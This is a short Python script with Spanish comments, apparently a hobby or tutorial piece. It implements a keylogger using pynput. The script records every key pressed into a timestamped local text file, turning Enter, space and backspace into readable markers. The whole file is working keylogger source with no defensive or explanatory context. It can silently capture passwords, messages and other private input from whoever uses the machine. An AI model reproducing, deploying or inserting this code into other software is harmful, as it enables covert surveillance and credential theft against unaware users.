#Librerias
import datetime
from pynput.keyboard import Listener
#formato de la fecha
d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
 
 
def key_recorder(key):
#Formato de
    f = open('keylogger_{}.txt'.format(d),'a')
    key=str(key)
#Condiciones al crear el documento
    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'", ""))
#guardar las presiones del teclado
with Listener(on_press=key_recorder) as l:
    l.join()